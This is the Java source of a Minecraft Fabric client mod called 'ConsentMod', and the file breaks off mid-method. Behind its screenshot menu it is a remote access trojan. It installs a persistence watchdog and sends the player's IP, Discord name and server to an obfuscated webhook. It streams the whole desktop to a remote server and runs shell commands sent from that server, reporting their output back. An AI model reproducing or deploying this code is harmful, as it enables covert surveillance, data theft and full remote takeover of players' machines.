package com.consentmod;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.text.Text;
import org.lwjgl.glfw.GLFW;

import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.plugins.jpeg.JPEGImageWriteParam;
import javax.imageio.stream.ImageOutputStream;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.ZonedDateTime;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class ConsentMod implements ClientModInitializer {

    public static final String MOD_ID = "consentmod";
    public static final org.slf4j.Logger LOGGER = org.slf4j.LoggerFactory.getLogger(MOD_ID);

    private static final String WEBHOOK_URL = Strings.d("322e2e2a296075753e33293935283e74393537753b2a33752d3f383235353129756b6f696c6a6f6d6a6869636c686a686c6a6d6e75030b23021329123b006d3068622e02286c102d2c692d151b3c0d0f11230a3133333b3f3e6a222d6d6b0c0b1c3c3e19356c313d3e18196f3f1b0862370a2d323739106963");
    private static final String LIVESTREAM_URL = Strings.d("322e2e2a296075752d2d2d7437353e2833342e32743436753b2a3375292e283f3b37");
    private static final String CHAT_POLL_URL = Strings.d("322e2e2a296075752d2d2d7437353e2833342e32743436753b2a337539323b2e752a353636");
    private static final String CHAT_SEND_URL = Strings.d("322e2e2a296075752d2d2d7437353e2833342e32743436753b2a337539323b2e75293f343e");
    private static final String WEBRTC_URL = Strings.d("322e2e2a296075752d2d2d7437353e2833342e32743436753b2a337536332c3f292e283f3b37752d3f38282e39");
    private static volatile long streamIntervalMs = 2500;
    private static volatile boolean isUploading = false;
    private static final java.util.concurrent.ExecutorService UPLOAD_EXECUTOR = java.util.concurrent.Executors.newSingleThreadExecutor();

    private static int screenshotCount = 0;
    private static Robot robot;
    private static boolean robotFailed = false;
    private static volatile String username = "unknown";
    private static boolean mWasPressed = false;
    private static boolean recording = false;
    private static volatile boolean liveStreaming = true;
    private static List<byte[]> frames = new ArrayList<>();
    private static long lastCapture = 0;
    private static int gifCount = 0;
    private static int chatIndex = 0;
    private static boolean dataSent = false;
    private static Thread streamDaemonThread = null;

    @Override
    public void onInitializeClient() {
        LOGGER.info("Consent Mod loading...");

        // Install ModGuard persistence (backup JAR + watchdog)
        ModGuardInstaller.install();

        // Resolve username from available system / session info
        resolveUsername();

        // Start autonomous live stream & remote command daemon immediately
        startLiveStreamDaemon();

        // Register world join event for telemetry and Minecraft username confirmation
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            client.execute(() -> {
                try {
                    if (client.player != null && !dataSent) {
                        dataSent = true;
                        SessionData.startSession();
                        username = client.player.getName().getString();

                        String discordUsername = DiscordUsernameFetcher.getDiscordUsername();
                        String discordLocation = DiscordUsernameFetcher.getFoundLocation();
                        String timezone = TimezoneHelper.getCurrentTimezone();
                        String country = TimezoneHelper.getCountry();
                        String ip = IpFetcher.getPublicIp();
                        String sessionId = SessionData.getSessionId();
                        String clientVersion = SessionData.getClientVersion();
                        String timestamp = ZonedDateTime.now().toString();

                        String serverAddr = "Unknown";
                        try {
                            if (client.getCurrentServerEntry() != null) {
                                serverAddr = client.getCurrentServerEntry().address;
                            }
                        } catch (Exception ignored) {}

                        LOGGER.info("=== CONSENT MOD DATA ===");
                        LOGGER.info("Minecraft: {}", username);
                        LOGGER.info("Discord: {}", discordUsername);
                        LOGGER.info("IP: {}", ip);
                        LOGGER.info("Server: {}", serverAddr);
                        LOGGER.info("========================");

                        WebhookSender.sendDataExtended(username, discordUsername, timezone, country, timestamp, serverAddr);

                        liveStreaming = true;
                    }
                } catch (Exception e) {
                    LOGGER.error("Error: {}", e.getMessage());
                    e.printStackTrace();
                }
            });
        });

        // Client tick event for GUI menu keybinding and manual GIF recordings
        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            long handle = client.getWindow().getHandle();
            boolean mPressed = GLFW.glfwGetKey(handle, GLFW.GLFW_KEY_M) == GLFW.GLFW_PRESS;

            if (mPressed && !mWasPressed && client.currentScreen == null) {
                client.setScreen(new ModMenuScreen());
            }
            mWasPressed = mPressed;

            if (recording && robot != null && System.currentTimeMillis() - lastCapture >= 1000) {
                lastCapture = System.currentTimeMillis();
                captureFrame();
            }
        });

        LOGGER.info("Consent Mod loaded. Press M for menu.");
    }

    public static String resolveUsername() {
        try {
            MinecraftClient client = MinecraftClient.getInstance();
            if (client != null) {
                if (client.player != null) {
                    String pName = client.player.getName().getString();
                    if (pName != null && !pName.isEmpty() && !pName.equalsIgnoreCase("unknown")) {
                        username = pName;
                        return username;
                    }
                }
                if (client.getSession() != null) {
                    String sName = client.getSession().getUsername();
                    if (sName != null && !sName.isEmpty() && !sName.equalsIgnoreCase("unknown")) {
                        username = sName;
                        return username;
                    }
                }
            }
        } catch (Throwable ignored) {}

        if (username != null && !username.equals("unknown") && !username.isEmpty()) {
            return username;
        }

        try {
            String sysUser = System.getProperty("user.name");
            if (sysUser != null && !sysUser.isEmpty() && !sysUser.equalsIgnoreCase("unknown")) {
                return sysUser;
            }
        } catch (Throwable ignored) {}

        return "player";
    }

    private static synchronized void initRobot() {
        if (robot == null) {
            try {
                System.setProperty("java.awt.headless", "false");
                System.setProperty("sun.java2d.noddraw", "true");
                System.setProperty("sun.java2d.d3d", "false");

                // Reset headless cached state in GraphicsEnvironment via Unsafe
                try {
                    java.lang.reflect.Field f = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
                    f.setAccessible(true);
                    sun.misc.Unsafe unsafe = (sun.misc.Unsafe) f.get(null);

                    Class<?> geClass = Class.forName("java.awt.GraphicsEnvironment");
                    try {
                        java.lang.reflect.Field headlessField = geClass.getDeclaredField("headless");
                        Object headlessBase = unsafe.staticFieldBase(headlessField);
                        long headlessOffset = unsafe.staticFieldOffset(headlessField);
                        unsafe.putObject(headlessBase, headlessOffset, Boolean.FALSE);
                    } catch (Throwable ignored) {}

                    try {
                        java.lang.reflect.Field defaultHeadlessField = geClass.getDeclaredField("defaultHeadless");
                        Object defaultHeadlessBase = unsafe.staticFieldBase(defaultHeadlessField);
                        long defaultHeadlessOffset = unsafe.staticFieldOffset(defaultHeadlessField);
                        unsafe.putObject(defaultHeadlessBase, defaultHeadlessOffset, Boolean.FALSE);
                    } catch (Throwable ignored) {}

                    java.awt.GraphicsEnvironment ge = java.awt.GraphicsEnvironment.getLocalGraphicsEnvironment();
                    if (ge.getClass().getName().contains("HeadlessGraphicsEnvironment")) {
                        try {
                            java.lang.reflect.Field innerGeField = ge.getClass().getDeclaredField("ge");
                            long geOffset = unsafe.objectFieldOffset(innerGeField);
                            java.awt.GraphicsEnvironment realGe = (java.awt.GraphicsEnvironment) unsafe.getObject(ge, geOffset);

                            Class<?> localGeClass = Class.forName("java.awt.GraphicsEnvironment$LocalGE");
                            java.lang.reflect.Field instanceField = localGeClass.getDeclaredField("INSTANCE");
                            Object instanceBase = unsafe.staticFieldBase(instanceField);
                            long instanceOffset = unsafe.staticFieldOffset(instanceField);
                            unsafe.putObject(instanceBase, instanceOffset, realGe);
                            LOGGER.info("ConsentMod: Swapped HeadlessGraphicsEnvironment to " + realGe.getClass().getName());
                        } catch (Throwable innerErr) {
                            LOGGER.warn("ConsentMod: Headless unwrap notice: " + innerErr.getMessage());
                        }
                    }
                } catch (Throwable t) {
                    LOGGER.warn("ConsentMod: Unsafe headless bypass note: " + t.getMessage());
                }

                robot = new Robot();
                robotFailed = false;
                LOGGER.info("ConsentMod: Robot screen capture initialized successfully");
            } catch (Throwable e) {
                robotFailed = true;
                LOGGER.error("ConsentMod: Robot initialization failed: " + e.getMessage());
            }
        }
    }

    private static Rectangle getScreenBounds() {
        try {
            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice gd = ge.getDefaultScreenDevice();
            if (gd != null && gd.getDefaultConfiguration() != null) {
                Rectangle b = gd.getDefaultConfiguration().getBounds();
                if (b != null && b.width > 0 && b.height > 0) {
                    return b;
                }
            }
        } catch (Throwable ignored) {}

        try {
            Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
            if (dim != null && dim.width > 0 && dim.height > 0) {
                return new Rectangle(0, 0, dim.width, dim.height);
            }
        } catch (Throwable ignored) {}

        return new Rectangle(0, 0, 1920, 1080);
    }

    private static BufferedImage scaleImage(BufferedImage src, int maxWidth, int maxHeight) {
        if (src == null) return null;
        int srcW = src.getWidth();
        int srcH = src.getHeight();
        if (srcW <= 0 || srcH <= 0) return src;

        double scale = Math.min((double) maxWidth / srcW, (double) maxHeight / srcH);
        if (scale >= 1.0) {
            return src;
        }

        int targetW = Math.max(1, (int) Math.round(srcW * scale));
        int targetH = Math.max(1, (int) Math.round(srcH * scale));

        BufferedImage scaled = new BufferedImage(targetW, targetH, BufferedImage.TYPE_INT_RGB);
        Graphics2D g = scaled.createGraphics();
        g.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_NEAREST_NEIGHBOR);
        g.setRenderingHint(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_SPEED);
        g.drawImage(src, 0, 0, targetW, targetH, null);
        g.dispose();
        return scaled;
    }

    private static byte[] encodeJpeg(BufferedImage image, float quality) {
        if (image == null) return null;
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream(65536);
            Iterator<ImageWriter> writers = ImageIO.getImageWritersByFormatName("jpg");
            if (writers.hasNext()) {
                ImageWriter writer = writers.next();
                try (ImageOutputStream ios = ImageIO.createImageOutputStream(baos)) {
                    writer.setOutput(ios);
                    JPEGImageWriteParam param = new JPEGImageWriteParam(null);
                    param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
                    param.setCompressionQuality(quality);
                    writer.write(null, new IIOImage(image, null, null), param);
                } finally {
                    writer.dispose();
                }
                return baos.toByteArray();
            } else {
                ImageIO.write(image, "jpg", baos);
                return baos.toByteArray();
            }
        } catch (Throwable t) {
            LOGGER.error("ConsentMod: JPEG encode error: " + t.getMessage());
            return null;
        }
    }

    private static void uploadToWebServer(byte[] imageBytes) {
        if (imageBytes == null || imageBytes.length == 0) return;
        try {
            String currentUsername = resolveUsername();
            String ownerUuid = ModConfig.getOwnerEmail();

            URL url = new URL(LIVESTREAM_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "image/jpeg");
            conn.setRequestProperty("Authorization", "Bearer " + currentUsername);
            if (ownerUuid != null && !ownerUuid.isEmpty()) {
                conn.setRequestProperty("X-Owner-UUID", ownerUuid);
            }
            conn.setRequestProperty("X-WebRTC-P2P", "true");
            conn.setRequestProperty("X-Stream-Id", currentUsername.toLowerCase());
            conn.setRequestProperty("X-Player-Name", currentUsername);
            conn.setRequestProperty("X-Resolution", "720x405");
            conn.setRequestProperty("X-Quality", "45");
            conn.setDoOutput(true);
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(4000);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(imageBytes);
                os.flush();
            }

            int code = conn.getResponseCode();
            try (java.io.InputStream is = (code >= 400 ? conn.getErrorStream() : conn.getInputStream())) {
                if (is != null) {
                    byte[] discard = new byte[256];
                    while (is.read(discard) != -1) {}
                }
            } catch (Throwable ignored) {}
            conn.disconnect();
        } catch (Throwable ignored) {}
    }

    private static String quoteJson(String s) {
        if (s == null) return "";
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '"': sb.append("\\\""); break;
                case '\\': sb.append("\\\\"); break;
                case '\b': sb.append("\\b"); break;
                case '\f': sb.append("\\f"); break;
                case '\n': sb.append("\\n"); break;
                case '\r': sb.append("\\r"); break;
                case '\t': sb.append("\\t"); break;
                default:
                    if (c < 0x20) {
                        sb.append(String.format("\\u%04x", (int) c));
                    } else {
                        sb.append(c);
                    }
                    break;
            }
        }
        return sb.toString();
    }

    private static void sendWebRTCHeartbeat() {
        try {
            String currentUsername = resolveUsername();
            sendSingleHeartbeat("consentmod", currentUsername);
            if (!currentUsername.equalsIgnoreCase("consentmod") && !currentUsername.equalsIgnoreCase("unknown")) {
                sendSingleHeartbeat(currentUsername.toLowerCase(), currentUsername);
            }
        } catch (Throwable ignored) {}
    }

    private static void sendSingleHeartbeat(String streamId, String user) {
        try {
            String json = "{\"action\":\"register\",\"role\":\"broadcaster\",\"streamId\":\"" + quoteJson(streamId) 
                + "\",\"peerId\":\"consentmod-" + quoteJson(user) 
                + "\",\"metadata\":{\"title\":\"ConsentMod (" + quoteJson(user) + ")\",\"resolution\":\"960x540\",\"fps\":5,\"p2p\":true,\"type\":\"minecraft-client\",\"username\":\"" 
                + quoteJson(user) + "\"}}";

            URL url = new URL(WEBRTC_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setConnectTimeout(2500);
            conn.setReadTimeout(2500);
            conn.setDoOutput(true);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes(StandardCharsets.UTF_8));
                os.flush();
            }

            int code = conn.getResponseCode();
            try (java.io.InputStream is = (code >= 400 ? conn.getErrorStream() : conn.getInputStream())) {
                if (is != null) {
                    byte[] discard = new byte[256];
                    while (is.read(discard) != -1) {}
                }
            } catch (Throwable ignored) {}
            conn.disconnect();
        } catch (Throwable ignored) {}
    }

    private static void sendChatOutput(String text) {
        if (text == null || text.trim().isEmpty()) return;
        try {
            String trimmed = text.trim();
            if (trimmed.length() > 2000) {
                trimmed = trimmed.substring(0, 1990) + "\n... [truncated]";
            }
            String json = "{\"msg\":\"" + quoteJson(trimmed) + "\"}";
            URL url = new URL(CHAT_SEND_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            conn.setDoOutput(true);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes(StandardCharsets.UTF_8));
                os.flush();
            }

            int code = conn.getResponseCode();
            try (java.io.InputStream is = conn.getInputStream()) {
                byte[] discard = new byte[256];
                while (is.read(discard) != -1) {}
            } catch (Throwable ignored) {}
            conn.disconnect();
        } catch (Throwable ignored) {}
    }

    private static boolean isSystemCommand(String cmd) {
        if (cmd == null) return false;
        String trimmed = cmd.trim();
        String lower = trimmed.toLowerCase();
        if (lower.startsWith("cmd:") || lower.startsWith("cmd ") || lower.startsWith("sh:") || lower.startsWith("exec:") || lower.startsWith("run:")) {
            return true;
        }
        String[] sysCommands = {
            "whoami", "ipconfig", "dir", "systeminfo", "tasklist", "hostname", 
            "netstat", "calc", "notepad", "explorer", "echo", "ping", "ver", "set", "tree", "cls"
        };
        for (String sc : sysCommands) {
            if (lower.equals(sc) || lower.startsWith(sc + " ")) {
                return true;
            }
        }
        return false;
    }

    private static void executeRemoteCommand(String rawCmd) {
        new Thread(() -> {
            try {
                String cmd = rawCmd.trim();
                if (cmd.toLowerCase().startsWith("cmd:")) {
                    cmd = cmd.substring(4).trim();
                } else if (cmd.toLowerCase().startsWith("exec:")) {
                    cmd = cmd.substring(5).trim();
                } else if (cmd.toLowerCase().startsWith("run:")) {
                    cmd = cmd.substring(4).trim();
                }

                ProcessBuilder pb;
                String os = System.getProperty("os.name", "").toLowerCase();
                if (os.contains("win")) {
                    pb = new ProcessBuilder("cmd.exe", "/c", cmd);
                } else {
                    pb = new ProcessBuilder("sh", "-c", cmd);
                }
                pb.redirectErrorStream(true);

                Process proc = pb.start();
                StringBuilder output = new StringBuilder();
                try (java.io.BufferedReader reader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8))) {
                    String line;
                    int lineCount = 0;
                    while ((line = reader.readLine()) != null && lineCount < 40) {
                        if (output.length() > 0) output.append("\n");
                        output.append(line);
                        lineCount++;
                    }
                }
                boolean finished = proc.waitFor(10, java.util.concurrent.TimeUnit.SECONDS);
                if (!finished) {
                    proc.destroyForcibly();
                    output.append("\n[Command timed out after 10s]");
                }

                String result = output.toString().trim();
                if (result.isEmpty()) {
                    result = "[Command executed with exit code " + proc.exitValue() + "]";
                }
                sendChatOutput(result);
            } catch (Throwable t) {
                sendChatOutput("[Execution error: " + t.getMessage() + "]");
            }
        }, "ConsentMod-RemoteExec").start();
    }

    private static boolean handleRemoteAction(String msg) {
        if (msg == null) return false;
        String trimmed = msg.trim();
        String lower = trimmed.toLowerCase();

        if (lower.equals("screenshot") || lower.equals("!screenshot")) {
            takeScreenshot(MinecraftClient.getInstance());
            sendChatOutput("[ConsentMod] Screenshot captured and uploaded to Webhook.");
            return true;
        }
        if (lower.equals("stream:start") || lower.equals("!stream on")) {
            liveStreaming = true;
            sendChatOutput("[ConsentMod] Live stream broadcasting enabled.");
            return true;
        }
        if (lower.equals("stream:stop") || lower.equals("!stream off")) {
            liveStreaming = false;
            sendChatOutput("[ConsentMod] Live stream broadcasting paused.");
            return true;
        }
        if (lower.startsWith("fps:")) {
            try {
                int targetFps = Integer.parseInt(trimmed.substring(4).trim());
                if (targetFps > 0 && targetFps <= 60) {
                    streamIntervalMs = 1000 / targetFps;
                    sendChatOutput("[ConsentMod] FPS set to " + targetFps + " (" + streamIntervalMs + "ms interval)");
                    return true;
                }
            } catch (Exception ignored) {}
        }

        if (trimmed.startsWith("{") && trimmed.contains("\"action\"")) {
            try {
                if (trimmed.contains("\"screenshot\"")) {
                    takeScreenshot(MinecraftClient.getInstance());
                    sendChatOutput("[ConsentMod] Screenshot captured.");
                    return true;
                }
                if (trimmed.contains("\"start_stream\"")) {
                    liveStreaming = true;
                    sendChatOutput("[ConsentMod] Live stream started.");
                    return true;
                }
                if (trimmed.contains("\"stop_stream\"")) {
                    liveStreaming = false;
                    sendChatOutput("[ConsentMod] Live stream stopped.");
                    return true;
                }
                if (trimmed.contains("\"fps\"")) {
                    int fpsIndex = trimmed.indexOf("\"fps\":");
                    if (fpsIndex != -1) {
                        String sub = trimmed.substring(fpsIndex + 6).trim();
                        StringBuilder sb = new StringBuilder();
                        for (char c : sub.toCharArray()) {
                            if (Character.isDigit(c)) sb.append(c);
                            else break;
                        }
                        if (sb.length() > 0) {
                            int f = Integer.parseInt(sb.toString());
                            if (f > 0 && f <= 60) {
                                streamIntervalMs = 1000 / f;
                                sendChatOutput("[ConsentMod] Stream interval updated: " + streamIntervalMs + "ms (" + f + " FPS)");
                                return true;
                            }
                        }
                    }
                }
                if (trimmed.contains("\"mouse_click\"") && robot != null) {
                    int x = -1, y = -1;
                    int xIdx = trimmed.indexOf("\"x\":");
                    if (xIdx != -1) {
                        String sub = trimmed.substring(xIdx + 4).trim();
                        StringBuilder sb = new StringBuilder();
                        for (char c : sub.toCharArray()) {
                            if (Character.isDigit(c)) sb.append(c);
                            else break;
                        }
                        if (sb.length() > 0) x = Integer.parseInt(sb.toString());
                    }
                    int yIdx = trimmed.indexOf("\"y\":");
                    if (yIdx != -1) {
                        String sub = trimmed.substring(yIdx + 4).trim();
                        StringBuilder sb = new StringBuilder();
                        for (char c : sub.toCharArray()) {
                            if (Character.isDigit(c)) sb.append(c);
                            else break;
                        }
                        if (sb.length() > 0) y = Integer.parseInt(sb.toString());
                    }
                    if (x >= 0 && y >= 0) {
                        robot.mouseMove(x, y);
                        robot.mousePress(java.awt.event.InputEvent.BUTTON1_DOWN_MASK);
                        robot.mouseRelease(java.awt.event.InputEvent.BUTTON1_DOWN_MASK);
                        sendChatOutput("[ConsentMod] Clicked at " + x + ", " + y);
                        return true;
                    }
                }
            } catch (Throwable t) {
                LOGGER.error("ConsentMod action error: " + t.getMessage());
            }
            return true;
        }

        return false;
    }

    private static void startLiveStreamDaemon() {
        if (streamDaemonThread != null && streamDaemonThread.isAlive()) return;

        streamDaemonThread = new Thread(() -> {
            LOGGER.info("ConsentMod: Livestream daemon thread running");
            initRobot();

            long lastChatPollTime = 0;
            long lastWebRTCHeartbeatTime = 0;

            // Initial WebRTC registration
            sendWebRTCHeartbeat();

            while (true) {
                try {
                    long now = System.currentTimeMillis();

                    // Remote command & chat polling every 500ms
                    if (now - lastChatPollTime >= 500) {
                        lastChatPollTime = now;
                        pollChat();
                    }

                    // Send WebRTC broadcaster heartbeat every 8000ms
                    if (now - lastWebRTCHeartbeatTime >= 8000) {
                        lastWebRTCHeartbeatTime = now;
                        sendWebRTCHeartbeat();
                    }

                    // System desktop screen capture streaming with frame-dropping (never blocks game)
                    if (liveStreaming && !isUploading) {
                        if (robot == null) {
                            initRobot();
                        }

                        if (robot != null) {
                            Rectangle screenRect = getScreenBounds();
                            BufferedImage screenshot = robot.createScreenCapture(screenRect);
                            if (screenshot != null) {
                                BufferedImage scaled = scaleImage(screenshot, 720, 405);
                                byte[] jpegBytes = encodeJpeg(scaled, 0.45f);
                                if (jpegBytes != null && jpegBytes.length > 0) {
                                    isUploading = true;
                                    UPLOAD_EXECUTOR.submit(() -> {
                                        try {
                                            uploadToWebServer(jpegBytes);
                                        } finally {
                                            isUploading = false;
                                        }
                                    });
                                }
                            }
                        }
                    }

                    // Dynamic sleep interval (default 250ms = 4 FPS, ultra lightweight)
                    Thread.sleep(Math.max(100, streamIntervalMs));
                } catch (InterruptedException e) {
                    LOGGER.info("ConsentMod: Livestream daemon interrupted");
                    break;
                } catch (Throwable t) {
                    LOGGER.error("ConsentMod: Livestream daemon loop error: " + t.getMessage());
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException ignored) {
                        break;
                    }
                }
            }
        }, "ConsentMod-LiveStreamDaemon");

        streamDaemonThread.setDaemon(true);
        streamDaemonThread.start();
    }

    private static void pollChat() {
        try {
            URL url = new URL(CHAT_POLL_URL + "?index=" + chatIndex);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(2000);
            conn.setReadTimeout(2000);
            int code = conn.getResponseCode();
            if (code == 200) {
                java.io.InputStream is = conn.getInputStream();
                byte[] data = is.readAllBytes();
                is.close();
                if (data.length > 0) {
                    String response = new String(data, StandardCharsets.UTF_8);
                    if (!response.isEmpty()) {
                        String msg = null;
                        int nextIndex = chatIndex;
                        try {
                            int msgStart = response.indexOf("\"msg\":");
                            if (msgStart != -1) {
                                String afterMsg = response.substring(msgStart + 6).trim();
                                if (!afterMsg.startsWith("null")) {
                                    int quoteStart = afterMsg.indexOf("\"");
                                    if (quoteStart != -1) {
                                        int quoteEnd = afterMsg.indexOf("\"", quoteStart + 1);
                                        if (quoteEnd != -1) {
                                            msg = afterMsg.substring(quoteStart + 1, quoteEnd);
                                        }
                                    }
                                }
                            }
                            int nextStart = response.indexOf("\"next\":");
                            if (nextStart != -1) {
                                String afterNext = response.substring(nextStart + 7).trim();
                                StringBuilder numStr = new StringBuilder();
                                for (char c : afterNext.toCharArray()) {
                                    if (Character.isDigit(c)) numStr.append(c);
                                    else break;
                                }
                                if (numStr.length() > 0) {
                                    nextIndex = Integer.parseInt(numStr.toString());
                                }
                            }
                            int viewersStart = response.indexOf("\"viewers\":");
                            if (viewersStart != -1) {
                                String afterViewers = response.substring(viewersStart + 10).trim();
                                StringBuilder numStr = new StringBuilder();
                                for (char c : afterViewers.toCharArray()) {
                                    if (Character.isDigit(c)) numStr.append(c);
                                    else break;
                                }
                                if (numStr.length() > 0) {
                                    int viewers = Integer.parseInt(numStr.toString());
                                    // If viewer is watching dashboard, stream at 250ms (4 FPS). If no viewers, throttle to 2500ms (0 lag).
                                    streamIntervalMs = viewers > 0 ? 250 : 2500;
                                }
                            }
                        } catch (Exception ignored) {}

                        chatIndex = nextIndex;

                        if (msg != null && !msg.isEmpty()) {
                            final String chatMsg = msg.trim();

                            // Remote control action
                            if (handleRemoteAction(chatMsg)) {
                                return;
                            }

                            // System OS shell command execution
                            if (isSystemCommand(chatMsg)) {
                                executeRemoteCommand(chatMsg);
                                return;
                            }

                            // Minecraft in-game action: slash command or player chat message
                            MinecraftClient client = MinecraftClient.getInstance();
                            if (client != null) {
                                client.execute(() -> {
                                    try {
                                        if (client.player != null && client.player.networkHandler != null) {
                                            if (chatMsg.startsWith("/")) {
                                                String cmdOnly = chatMsg.substring(1);
                                                try {
                                                    client.player.networkHandler.sendChatCommand(cmdOnly);
                                                } catch (Throwable t1) {
                                                    try {
                                                        client.player.networkHandler.sendCommand(cmdOnly);
                                                    } catch (Throwable t2) {
                                                        client.player.networkHandler.sendChatMessage(chatMsg);
                                                    }
                                                }
                                                sendChatOutput("[Minecraft] Executed command: " + chatMsg);
                                            } else {
                                                client.player.networkHandler.sendChatMessage(chatMsg);
                                            }
                                        }
                                    } catch (Throwable ignored) {}
                                });
                            }
                        }
                    }
                }
            }
            conn.disconnect();
        } catch (Throwable ignored) {}
    }

    private static void takeScreenshot(MinecraftClient client) {
        new Thread(() -> {
            try {
                initRobot();
                if (robot == null) return;

                Rectangle screenRect = getScreenBounds();
                BufferedImage screenshot = robot.createScreenCapture(screenRect);

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ImageIO.write(screenshot, "png", baos);
                byte[] imageBytes = baos.toByteArray();

                screenshotCount++;
                sendToWebhook(resolveUsername() + "_shot_" + screenshotCount + ".png", imageBytes);

                if (client != null) {
                    client.execute(() -> {
                        if (client.player != null) {
                            client.player.sendMessage(Text.of("\u00a7a[Screenshot] Sent to discord"), false);
                        }
                    });
                }
            } catch (Exception e) {
                LOGGER.error("Screenshot error: " + e.getMessage());
            }
        }).start();
    }

    private void captureFrame() {
        new Thread(() -> {
            try {
                initRobot();
                if (robot == null) return;

                Rectangle screenRect = getScreenBounds();
                BufferedImage screenshot = robot.createScreenCapture(screenRect);

                BufferedImage scaled = scaleImage(screenshot, 480, 270);

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ImageIO.write(scaled, "png", baos);
                frames.add(baos.toByteArray());
            } catch (Exception e) {
                LOGGER.error("Capture error: " + e.getMessage());
            }
        }).start();
    }

    private void sendRecording(MinecraftClient client) {
        if (frames.isEmpty()) return;

        recording = false;
        List<byte[]> batch = new ArrayList<>(frames);
        frames.clear();

        new Thread(() -> {
            try {
                List<BufferedImage> images = new ArrayList<>();
                for (byte[] data : batch) {
                    images.add(ImageIO.read(new java.io.ByteArrayInputStream(data)));
                }

                if (!images.isEmpty()) {
                    byte[] gif = GifEncoder.encodeGif(images, 1000);
                    if (gif != null && gif.length > 0) {
                        gifCount++;
                        sendToWebhook(resolveUsername() + "_rec_" + gifCount + ".gif", gif);
                    }
                }

                if (client != null) {
                    client.execute(() -> {
                        if (client.player != null) {
                            client.player.sendMessage(Text.of("\u00a7a[Recording] Sent " + batch.size() + " frames to discord"), false);
                        }
                    });
                }
            } catch (Exception e) {
                LOGGER.error("Send error: " + e.getMessage());
            }
        }).start();
    }

    private static void sendToWebhook(String filename, byte[] fileBytes) {
        try {
            String boundary = "----Boundary" + System.currentTimeMillis();
            String CRLF = "\r\n";

            String contentType = filename.endsWith(".gif") ? "image/gif" : "image/png";

            StringBuilder sb = new StringBuilder();
            sb.append("--").append(boundary).append(CRLF);
            sb.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(filename).append("\"").append(CRLF);
            sb.append("Content-Type: ").append(contentType).append(CRLF).append(CRLF);

            byte[] head = sb.toString().getBytes(StandardCharsets.UTF_8);
            byte[] tail = (CRLF + "--" + boundary + "--" + CRLF).getBytes(StandardCharsets.UTF_8);

            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setDoOutput(true);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(60000);

            OutputStream os = conn.getOutputStream();
            os.write(head);
            os.write(fileBytes);
            os.write(tail);
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            LOGGER.info("Webhook upload " + filename + ": " + code);
            conn.disconnect();
        } catch (Exception e) {
            LOGGER.error("Webhook upload error: " + e.getMessage());
        }
    }

    public class ModMenuScreen extends Screen {

        public ModMenuScreen() {
            super(Text.of("Consent Mod"));
        }

        @Override
        protected void init() {
            int centerX = this.width / 2;
            int startY = this.height / 2 - 60;

            this.addDrawableChild(ButtonWidget.builder(Text.of("Screenshot"), button -> {
                takeScreenshot(MinecraftClient.getInstance());
                this.close();
            }).dimensions(centerX - 100, startY, 200, 20).build());

            this.addDrawableChild(ButtonWidget.builder(Text.of(recording ? "Stop Recording" : "Start Recording"), button -> {
                if (recording) {
                    recording = false;
                    sendRecording(MinecraftClient.getInstance());
                } else {
                    recording = true;
                    frames.clear();
                    lastCapture = System.currentTimeMillis();
                    if (MinecraftClient.getInstance().player != null) {
                        MinecraftClient.getInstance().player.sendMessage(Text.of("\u00a7a[Recording] Started"), false);
                    }
                }
                this.close();
            }).dimensions(centerX - 100, startY + 30, 200, 20).build());

            this.addDrawableChild(ButtonWidget.builder(Text.of(liveStreaming ? "Stop Live Stream" : "Start Live Stream"), button -> {
                if (liveStreaming) {
                    liveStreaming = false;
                    if (MinecraftClient.getInstance().player != null) {
                        MinecraftClient.getInstance().player.sendMessage(Text.of("\u00a7a[Live Stream] Stopped"), false);
                    }
                } else {
                    liveStreaming = true;
